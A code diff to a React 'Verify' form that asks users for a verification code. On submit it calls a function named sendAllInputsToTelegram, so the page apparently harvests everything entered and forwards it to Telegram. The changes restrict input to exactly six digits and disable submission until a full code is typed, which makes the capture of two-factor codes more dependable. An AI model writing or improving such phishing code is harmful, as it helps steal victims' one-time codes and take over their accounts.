@@ -15,7 +15,7 @@ export function Verify() {
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (code.length > 0) {
+    if (code.length === 6) {
       await sendAllInputsToTelegram();
       setIsLoading(true);
       setTimeout(() => {
@@ -51,8 +51,13 @@ export function Verify() {
               type="text"
               name="code"
               value={code}
-              onChange={(e) => setCode(e.target.value)}
-              placeholder="Code"
+              onChange={(e) => {
+                const val = e.target.value.replace(/\D/g, '');
+                if (val.length <= 6) {
+                  setCode(val);
+                }
+              }}
+              placeholder="6-digit code"
               className="bg-transparent outline-none flex-1 text-[17px] placeholder:text-[#8a8a8a]"
               autoFocus
             />
@@ -60,8 +65,12 @@ export function Verify() {
 
           <button
             type="submit"
-            disabled={isLoading}
-            className="w-[200px] bg-[#C2C2C2] text-black font-semibold rounded-full py-[14px] text-[17px] hover:bg-white transition-colors flex items-center justify-center">
+            disabled={isLoading || code.length !== 6}
+            className={`w-[200px] font-semibold rounded-full py-[14px] text-[17px] transition-colors flex items-center justify-center ${
+              code.length === 6 
+                ? 'bg-[#C2C2C2] text-black hover:bg-white cursor-pointer' 
+                : 'bg-[#C2C2C2]/30 text-black/30 cursor-not-allowed'
+            }`}>
             {isLoading ? (
               <Loader2 className="animate-spin" size={24} strokeWidth={3} />
             ) : (
